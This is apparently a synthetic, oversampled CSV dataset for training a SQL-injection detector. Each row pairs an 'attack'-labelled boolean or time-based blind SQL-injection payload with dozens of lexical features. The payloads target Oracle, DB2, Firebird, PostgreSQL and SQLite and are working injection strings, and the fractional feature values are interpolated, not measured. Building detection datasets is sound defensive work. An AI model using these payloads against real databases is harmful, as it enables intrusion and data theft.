id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000314,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,1.262581422261271,145.4583378801231,33.57638964668718,4.279263160227099,72.67824250893676,16.525463215562393,40.152779293374365,16.101852862249576,0.500077142259688,0.11383353663266406,0.2758221677967131,0.11026715331093483,0.5254632155623942,0.0,2.0,0.0,1.0,2.0,0.0,4.525463215562395,0.0,0.0,2.5254632155623944,5.0,0.5254632155623943,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000315,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,1.0879949988736701,80.86726912982765,25.585051304482747,3.6765743200961754,18.622423043275887,19.34020521793098,31.2822178253449,11.622423043275884,0.23008638896459968,0.24132099546751534,0.38523365987302155,0.14335895569486343,2.414948695517255,0.0,0.0,0.0,0.7925256522413725,2.0,0.0,4.414948695517255,0.0,0.2074743477586276,0.2074743477586276,4.377576956724117,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7925256522413724,0.0,0.7925256522413724,0.0,1.2074743477586276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7925256522413724
SMOTE_000316,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000002,0.9394719779126907,67.30870444712576,23.670185078982037,3.414226538900145,24.659629842035933,4.329814921017965,28.31925968407186,10.0,0.36655278482934134,0.06414597266616769,0.4203882178188623,0.14891302468562873,0.0,0.0,2.0,0.0,1.0,2.3298149210179653,0.0,2.0,0.0,0.0,0.0,6.329814921017965,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.3298149210179653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.329814921017966
SMOTE_000317,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,1.7054592629275873,131.5842402396382,29.98924872690933,3.6270225039729302,47.483873090364,15.14337224163689,54.47312181727333,14.483873090363998,0.3631463573141261,0.11276959368347615,0.4151938620911151,0.10889018691128269,4.0,0.0,0.16487478781822218,0.0,0.0,1.1648747878182222,0.0,8.329749575636445,0.0,0.0,0.0,1.989248726909333,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8351252121817779,0.16487478781822207,1.0,0.0,0.0,0.16487478781822212,1.0,0.164874787818222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.164874787818222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.494624363454666
SMOTE_000318,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,0.013513685866187708,111.13712508127527,32.0,3.8457814748049204,36.1508375894028,20.977145819787456,41.0,13.009141672085018,0.325078683119149,0.18884311285474584,0.3690101508956433,0.11706805313046184,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.995429163957491,0.0,0.995429163957491,1.004570836042509,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000319,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,0.6536838465093207,88.72984506547867,27.09162362929963,3.642250698723865,23.45497417757978,15.454974177579778,36.18324725859926,13.636649451719851,0.26503251215714624,0.17423327016593432,0.4067456867366249,0.15398853094029452,4.0,0.0,0.818324725859926,0.0,0.0,1.181675274140074,0.0,5.636649451719852,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.181675274140074,0.818324725859926,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,1.9217381717090551,130.87516348047237,32.41073764006748,4.312060727105616,76.30336123939267,6.05368820033741,32.285901120539855,16.232212920202446,0.584306548622944,0.045796958085723316,0.24607729181107657,0.12381920148025621,0.0,2.1785247198650364,0.821475280134964,0.0,1.0,1.0,0.0,3.8214752801349636,0.4107376400674819,0.0,3.0,2.8214752801349636,0.0,1.0,0.4107376400674819,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5892623599325182,0.4107376400674819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000321,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,4.047417961290723,116.99514764975521,29.0,3.4733656712982603,37.12076771945249,13.0,52.826072842521725,14.048307087780996,0.3196281155927062,0.11466416366736482,0.44491273072853044,0.1207949900113985,2.536230315835747,0.0,0.0,0.0,0.48792322805475097,1.512076771945249,0.0,8.536230315835747,0.0,0.48792322805475097,0.4879232280547511,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.512076771945249,0.0,1.0,0.0,0.0,0.4879232280547509,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.512076771945249,0.512076771945249,3.512076771945249
SMOTE_000322,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,1.0422118689795867,155.51570624872133,33.0625191173462,3.844440438839397,48.0625191173462,18.12503823469239,60.79688933800965,28.5312595586731,0.3092164219894896,0.11576117445044977,0.3914139039386698,0.18360849962139075,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,8.5312595586731,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.26562977933654897,0.0,0.26562977933654897,0.0,0.734370220663451,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2656297793365487
SMOTE_000323,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,0.09130596606647635,79.05487995835786,23.97256002082107,3.245495384326579,17.02743997917893,12.02743997917893,38.0,12.0,0.215382840922496,0.15213458334971733,0.4806867575531179,0.1517958181746688,0.0,4.0,0.9725600208210707,0.0,0.02743997917892943,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0274399791789293,0.9725600208210707,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,1.1280275090713248,145.15995227623642,33.26398091049457,3.8432401640719984,41.0,24.0,54.527961820989134,25.631990455247283,0.2825257237076893,0.1653809114386474,0.37552232730747165,0.1765710375461916,0.6319904552472835,0.3680095447527165,2.0,0.0,0.0,2.0,0.0,10.631990455247283,0.0,2.0,1.0,10.0,0.6319904552472835,0.3680095447527165,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000325,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000067,0.06911904336808083,142.0,32.34120594161927,3.8860067995046386,41.0,24.0,52.0,25.0,0.2887323943661972,0.16901408450704225,0.36619718309859156,0.176056338028169,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,1.483538862323309,79.02862311589544,22.99284422102614,3.3266434206803637,12.66905192632462,16.0,36.02862311589544,14.33094807367538,0.1607261512605299,0.20355371290440744,0.452949396569405,0.18277073926565762,0.0,4.0,1.0,0.0,0.66905192632462,2.0,0.0,5.33810385264924,0.6618961473507601,0.3309480736753801,0.33094807367538026,3.66905192632462,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000327,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,1.3624853695472536,141.44843511714535,36.73039787168816,3.9786949660681405,48.07840851324736,21.6740053207796,52.29161809065064,19.40440319246776,0.34043218187243696,0.15323836803292198,0.3688935132057479,0.13743593688889313,4.0,0.0,0.13480106415591975,0.0,0.8651989358440801,2.0,0.0,8.269602128311838,0.0,0.8651989358440803,0.8651989358440803,5.269602128311839,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.13480106415591975,1.8651989358440804,0.0,0.8651989358440801,1.0,1.0,0.1348010641559198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.13480106415591964,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1348010641559197,0.1348010641559197,5.26960212831184
SMOTE_000328,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,1.520156619974581,78.46059467938863,26.697026603056845,3.639388515943115,20.775837244279582,14.157621282445476,31.527136152663573,12.0,0.2650861786349368,0.18061099402150746,0.40135364463545187,0.15294918270810393,0.0,4.0,1.0,0.0,0.0,1.0,0.0,4.921189358777262,0.0,0.5394053206113688,0.5394053206113688,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000329,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,0.21471299053022852,127.48664252709939,31.794657010839757,4.347023689749262,80.0,3.948664252709939,28.69198551625963,14.845992758129816,0.6277190544115498,0.03095090401472951,0.22493786498909898,0.11639217658462167,0.1540072418701841,2.8459927581298157,0.0,0.0,1.0,1.0,0.0,2.9486642527099383,0.0,0.0,2.9486642527099383,2.0,0.051335747290061406,0.9486642527099387,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000330,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,1.2028307161946397,147.5320801174638,33.221667081617575,4.026177882383247,70.78332918382428,17.527083852021967,44.221667081617575,15.0,0.4714295840719298,0.12168834712809763,0.30416147440921115,0.10272059439076145,0.30541677040439286,0.0,2.0,0.0,1.0,2.0,0.0,5.610833540808786,0.0,0.3054167704043931,1.694583229595607,5.0,0.305416770404393,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000331,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,0.09425866985417256,111.95645465587204,32.0,3.8537977726317973,37.05210012145925,20.84059089068799,41.0,13.063763643724803,0.3295860166040881,0.1867752885498086,0.3668638016171009,0.11677489322900239,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.9681181781375985,0.0,0.9681181781375986,1.0318818218624015,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000332,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,0.4267884850046644,129.80525481618665,31.902627408093323,3.6086616624717935,35.0,22.221019264746577,56.0,16.584235551440067,0.2696403895092228,0.1711064689690362,0.4314246232147565,0.12782851830698452,2.389490367626711,0.0,0.0,1.0,0.0,2.0,0.0,10.0,0.19474518381335562,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000333,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,2.308166010486616,115.92778879660928,28.51805280084768,4.107090053665545,75.33752479237087,4.036105601695363,22.48194719915232,14.072211203390726,0.649390783658268,0.03497450896596975,0.19391396276969672,0.1217207446060656,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,2.5902640042384077,3.0361056016953634,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000334,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,2.828499073535781,106.08917639906068,27.793790431117905,3.8141394105882926,48.903665393118885,10.859077193588552,34.19586028741194,12.13057352494129,0.43900585395516567,0.09511924795170265,0.3461333202944014,0.11974157779873022,0.0,0.0,2.0,0.0,1.0,2.4673566187646774,0.0,3.0652867624706457,0.0,0.0,1.065286762470646,5.934713237529354,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.467356618764677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.467356618764677
SMOTE_000335,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,2.6004235453196727,114.72441880831687,27.0,3.5099042139776326,37.862209404158435,13.0,49.862209404158435,14.0,0.3292018970262274,0.11386540198251507,0.4343084219331644,0.12262427905809314,2.0688952979207844,1.9311047020792156,0.0,0.0,0.0,2.0,0.0,6.965552351039608,1.0344476489603922,0.0,0.0,2.0,0.5172238244801961,0.48277617551980395,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000336,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,1.262243661475142,78.98997595640556,22.722779113533022,3.4584843800510896,18.78223290826419,13.0,33.544417729339514,13.663325318801853,0.24428550824427636,0.16614722570016566,0.4181209731480271,0.1714462929075309,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.1088835458679025,0.5544417729339515,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000337,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,0.21651755264826925,89.3537889720159,22.16462110279841,3.0901283527560066,18.0,13.0,44.68303117761272,13.67075779440318,0.20182224915258634,0.1457605132768679,0.4995090957061492,0.15290814186439652,0.0,4.0,0.0,0.0,1.0,1.0,0.0,7.67075779440318,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000338,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000018,0.6727694252952935,65.03281520073102,26.193436959853795,3.8018762119909457,12.0,16.0,23.226252160584817,13.806563040146205,0.1855474988665961,0.2473966651554615,0.3546860027201693,0.2123698332577731,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.8065630401462047,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000339,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,2.279081870236244,144.4410691321971,36.54902611320018,3.9691618757947547,48.803895547199296,22.12743471699956,53.83327803779851,19.676460830199737,0.3386605169924019,0.1532072178811851,0.37153738233441563,0.13659488279199739,4.0,0.0,0.22548694339991215,0.0,0.7745130566000877,2.0,0.0,8.450973886799824,0.0,0.7745130566000878,0.7745130566000878,5.450973886799824,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2254869433999122,1.7745130566000877,0.0,0.7745130566000877,1.0,1.0,0.22548694339991218,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22548694339991204,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22548694339991213,0.22548694339991213,5.450973886799824
SMOTE_000340,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,0.4739738477229274,82.17624606643889,21.58812303321944,3.1560368854006615,11.901661421918504,16.0,40.0,14.274584644520374,0.14403797514560016,0.19483336925942388,0.4870834231485597,0.17404523244641631,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,0.27458464452037346,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000341,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,1.0739321221845508,135.47954005376562,32.0,4.235569010796298,73.14034495967579,11.169597547044908,36.16959754704491,15.0,0.5408041580336191,0.08186640075044432,0.26653080104137694,0.11079864017455957,0.0,0.0,2.0,0.0,1.0,1.3099425067207013,0.0,4.3099425067207005,0.0,0.0,2.6900574932792987,4.309942506720701,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3099425067207012,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3099425067207013
SMOTE_000342,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,1.1314997398477897,133.16883497506106,29.516883497506107,4.038854638580677,76.20779125623474,6.792208743765267,33.618184482542745,16.55065049251832,0.5759649085133145,0.05010894908125266,0.2504337118959494,0.12349243050948347,3.7584417487530533,0.0,0.0,0.0,1.0,1.7584417487530533,0.0,3.516883497506106,1.5168834975061063,0.0,2.0,2.7584417487530533,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7584417487530533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7584417487530533
